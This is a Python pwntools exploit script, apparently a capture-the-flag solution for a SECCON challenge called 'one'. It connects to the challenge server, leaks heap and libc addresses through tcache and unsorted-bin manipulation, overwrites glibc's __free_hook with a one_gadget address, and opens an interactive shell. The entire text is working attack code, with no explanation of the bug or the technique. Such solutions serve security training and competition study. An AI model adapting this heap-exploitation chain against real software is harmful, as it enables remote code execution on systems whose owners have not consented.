from pwn import *

libc = ELF("./libc-2.27.so")
context.arch = 'amd64'

def add(content):
	r.sendlineafter('>', '1')
	r.sendafter('>', content)

def show():
	r.sendlineafter('>', '2')

def delete():
	r.sendlineafter('>', '3')

def DEBUG():
	gdb.attach(r)

#r = process('./one')
r = remote('one.chal.seccon.jp', 18357)

add(flat(0, 0x91, 0, 0) + '\x0a')
add('\x0a')
add('\x0a')
add('\x0a')
delete()
delete()
delete()

show()
heap_base = u64(r.recvn(7)[1:]+'\x00'*2) - 0x1270
print "heap_base @ ", hex(heap_base)

target = heap_base + 0x1190
add(flat(target)+'\x0a')
add('\x0a')
add('\x0a')
for _ in range(8):
	delete()

show()
libc_base = u64(r.recvn(7)[1:]+'\x00'*2) - 0x3ebca0
print "libc_base @ ", hex(libc_base)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[1]
print "one_shot @ ", hex(one_shot)
free_hook = libc_base + libc.symbols['__free_hook']
print "free_hook @ ", hex(free_hook)

add('\x0a')
delete()
delete()
add(flat(free_hook, 0) + '\x0a')
add('\x0a')
add(p64(one_shot) + '\x0a')
delete()
#DEBUG()

r.interactive()